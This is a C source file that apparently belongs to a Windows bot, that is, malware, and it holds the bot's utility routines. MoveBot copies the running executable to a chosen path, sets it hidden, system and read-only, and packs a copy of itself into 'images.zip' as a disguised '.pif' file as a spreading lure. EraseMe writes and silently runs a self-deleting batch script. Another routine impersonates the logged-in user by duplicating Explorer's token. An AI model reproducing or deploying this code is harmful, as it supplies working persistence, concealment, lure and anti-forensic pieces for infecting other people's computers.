#include "../Headers/includes.h"
#include "../Headers/functions.h"

#ifdef DEBUG
/*
Clean and Clear debug report
(needed : DbgView.exe)
*/
void DebugMsg(char *format, ...)
{
	int len;
	char buff[512];
	va_list ap;

	va_start(ap, format);
	len = _vsnprintf(buff, sizeof(buff), format, ap);
	va_end(ap);
	OutputDebugString(buff);
}
#endif

int SplitParams(char *a[MAX_TOKENS],char *line,int depth)
{
	a[0]=strtok(line," ");
	int i;
	for (i=1;i<depth;i++)
	{
		a[i]=strtok(NULL," ");
		if (a[i])
			continue;
		else
			break;
	}
	return i;
}

BOOL MoveBot(char *MTP, char *Bname)
{
	char CurrentPath[MAX_PATH],CurrentPathF[MAX_PATH],MoveToPathF[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL),CurrentPathF,sizeof(CurrentPathF));
	_snprintf(MoveToPathF,sizeof(MoveToPathF),"%s\\%s",MTP,Bname);
	strcpy(CurrentPath,CurrentPathF);
	fPathRemoveFileSpec(CurrentPath);

	char buf3[260],windir[260];

	GetWindowsDirectory(windir,sizeof(windir));
	GetModuleFileName(NULL,buf3,MAX_PATH);

	strcat(windir,"\\images.zip");
    zip_store(buf3,windir,"IMG34814.pif");
	
	if (lstrcmpi(CurrentPathF,MoveToPathF))
	{

		if (GetFileAttributes(MoveToPathF) != DWORD(-1))
			SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_NORMAL);

		// loop only once to make sure the file is copied.
		BOOL bFileCheck=FALSE;
		BOOL bCFRet=FALSE;
		while ((bCFRet=CopyFile(CurrentPathF,MoveToPathF,FALSE)) == FALSE)
		{
			DWORD result = GetLastError();

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED))
			{
				bFileCheck=TRUE; // check to see if its already running! then try 1 last time.
				Sleep(15000);
			}
			else
				break;
		}

		//SetFileTime(MoveToPathF);
		SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
		
		if (bCFRet)
			return TRUE;

	}
	return FALSE;
}
char *substr(char *input, int start, int end)
{
	static char output[1024];
	//ZeroMemory(output,sizeof(output));
	
	for (int y=0;y<256;y++)
		output[y]='\0';
	
	for (int i=start,t=0;i<=end;i++,t++)
		output[t]=input[i];
	return (output);
}

#ifndef NO_WILDCARD
// Wildcard function(s) from: http://user.cs.tu-berlin.de/~schintke/references/wildcards/wildcards.c.html
int set(char **wildcard, char **test)
{
	int fit = 0, negation = 0, at_beginning = 1;

	if ('!' == **wildcard) {
		negation = 1;
		(*wildcard)++;
	}
	while ((']' != **wildcard) || (1 == at_beginning)) {
		if (0 == fit) {
			if (('-' == **wildcard) && ((*(*wildcard - 1)) < (*(*wildcard + 1)))
				&& (']' != *(*wildcard + 1)) && (0 == at_beginning)) {
				if (((**test) >= (*(*wildcard - 1))) && ((**test) <= (*(*wildcard + 1)))) {
					fit = 1;
					(*wildcard)++;
				}
			}
			else if ((**wildcard) == (**test))
              fit = 1;
		}
		(*wildcard)++;
		at_beginning = 0;
	}
	if (1 == negation)
		fit = 1 - fit;
	if (1 == fit) 
		(*test)++;

	return (fit);
}
int asterisk(char **wildcard, char **test)
{
	int fit = 1;

	(*wildcard)++; 
	while (('\000' != (**test)) && (('?' == **wildcard) || ('*' == **wildcard))) {
		if ('?' == **wildcard) 
			(*test)++;
		(*wildcard)++;
	}
	while ('*' == (**wildcard))
		(*wildcard)++;

	if (('\0' == (**test)) && ('\0' != (**wildcard)))
		return (fit = 0);
	if (('\0' == (**test)) && ('\0' == (**wildcard)))
		return (fit = 1); 
	else {
		if (0 == wildcardfit(*wildcard, (*test))) {
			do {
				(*test)++;
				while (((**wildcard) != (**test)) && ('['  != (**wildcard)) && ('\0' != (**test)))
					(*test)++;
			} while ((('\0' != **test))?(0 == wildcardfit ((char *)*wildcard, (*test))):(0 != (fit = 0)));
		}
		if (('\0' == **test) && ('\0' == **wildcard))
			fit = 1;
		return (fit);
	}
}
int wildcardfit(char *wildcard, char *test)
{
	int fit = 1;
  
	for (; ('\000' != *wildcard) && (1 == fit) && ('\000' != *test); wildcard++) {
		switch (*wildcard) {
		//case '[':
		//	wildcard++;
		//	fit = set (&wildcard, &test);
		//	break;
		case '?':
			test++;
			break;
		case '*':
			fit = asterisk (&wildcard, &test);
			wildcard--;
			break;
		default:
			fit = (int) (*wildcard == *test);
			test++;
		}
	}
	while ((*wildcard == '*') && (1 == fit)) 
		wildcard++;

	return ((int) ((1 == fit) && ('\0' == *test) && ('\0' == *wildcard)));
}
#endif // NO_WILDCARD


void EraseMe(BOOL nopause/*=FALSE*/)
{
	char buffer[1024], cpbot[MAX_PATH], batfile[MAX_PATH];
	HANDLE f;
	DWORD r;

	GetTempPath(sizeof(buffer), buffer);
	GetModuleFileName(GetModuleHandle(NULL), cpbot, sizeof(cpbot));// get our file name
	sprintf(batfile, "%s\\removeMe%i%i%i%i.bat",buffer,rand()%9,rand()%9,rand()%9,rand()%9);

	SetFileAttributes(cpbot,FILE_ATTRIBUTE_NORMAL);

	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close.
		// the ping is there to slow it down in case the file cant get erased,
		// dont wanna rape the cpu.
		char delBatch[512];
		if (!nopause)
		{
			sprintf(delBatch,
	"@echo off\r\n"
	":Repeat\r\n"
//	"attrib -A -S -H -R \"%s\">nul\r\n"
	"del \"%s\">nul\r\n"
	"ping 0.0.0.0>nul\r\n"
	"if exist \"%s\" goto Repeat\r\n"
	"del \"%%0\"\r\n",cpbot,cpbot,cpbot);
		}
		else
		{
			sprintf(delBatch,
	"@echo off\r\n"
	":Repeat\r\n"
//	"attrib -A -S -H -R \"%s\">nul\r\n"
	"del \"%s\">nul\r\n"
	"if exist \"%s\" goto Repeat\r\n"
	"del \"%%0\"\r\n",cpbot,cpbot,cpbot);
		}
		
		WriteFile(f, delBatch, strlen(delBatch), &r, NULL);
		CloseHandle(f);

		// execute the batch file
		fShellExecute(NULL, NULL, batfile, NULL, NULL, SW_HIDE);
	}
	
	return;
}

void uninstall(BOOL thread, BOOL difbot)
{
	
	ReleaseMutex(xetum);
	if (!thread)
	{
		killthreadall();
		EraseMe();
	}
	return;
}

#ifndef NO_FLUSHDNS
BOOL FlushDNSCache(void)
{
	BOOL bRet = FALSE;
	if (fDnsFlushResolverCache)
		bRet=fDnsFlushResolverCache();
	return bRet;
}
#endif

BOOL IsServiceRunning(char *name)
{
    ENUM_SERVICE_STATUS enumeration[10];
    DWORD bytesneeded, servicesreturned, resumehandle = 0;

    SC_HANDLE handle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

    while (EnumServicesStatus(handle, SERVICE_WIN32, SERVICE_STATE_ALL, enumeration,
                              sizeof(ENUM_SERVICE_STATUS)*10, &bytesneeded, &servicesreturned, &resumehandle) ||
            GetLastError() == ERROR_MORE_DATA)
    {
        for (int i=0; i < (int)servicesreturned; i++)
        {
            if (!strcmp(enumeration[i].lpServiceName,name))
            {
                if (enumeration[i].ServiceStatus.dwCurrentState != SERVICE_RUNNING)
                {
                    return FALSE;
                }
                else
                    return TRUE;
            }
        }
        if (resumehandle == 0)
            break;
    }
    CloseServiceHandle(handle);
    return FALSE;
}


void ImpersonateInteractiveUser(void)
{
    HANDLE hToken=NULL;
    HANDLE hProcess=NULL;
    DWORD processID=GetExplorerProcessID();
    if(processID)
    {
        hProcess=OpenProcess(PROCESS_ALL_ACCESS,TRUE,processID);
        if (hProcess)
        {
            if (OpenProcessToken(hProcess,TOKEN_QUERY|TOKEN_DUPLICATE,&hToken))
            {
                ImpersonateLoggedOnUser(hToken);
                CloseHandle(hToken);
            }
            CloseHandle(hProcess);
        }
    }
}


DWORD GetExplorerProcessID(void)
{
    HANDLE hProcess;
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    DWORD Explorer;
    unsigned int i;
    char szProcessName[MAX_PATH];
    HMODULE hMod;
    BOOL success = FALSE;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    {
        return 0;
    }
    cProcesses = cbNeeded / sizeof(DWORD);
    for (i = 0; i < cProcesses; i++)
    {
        strcpy(szProcessName, "unknown");
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE,FALSE,aProcesses[i]);
        if (NULL != hProcess)
        {
            if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
            {
                GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
                if (lstrcmpi("Explorer.exe", szProcessName) == 0)
                {
                    Explorer = aProcesses[i];
                    i = cProcesses;
                    return Explorer;
                }
            }
        }
    }
    return 0;
}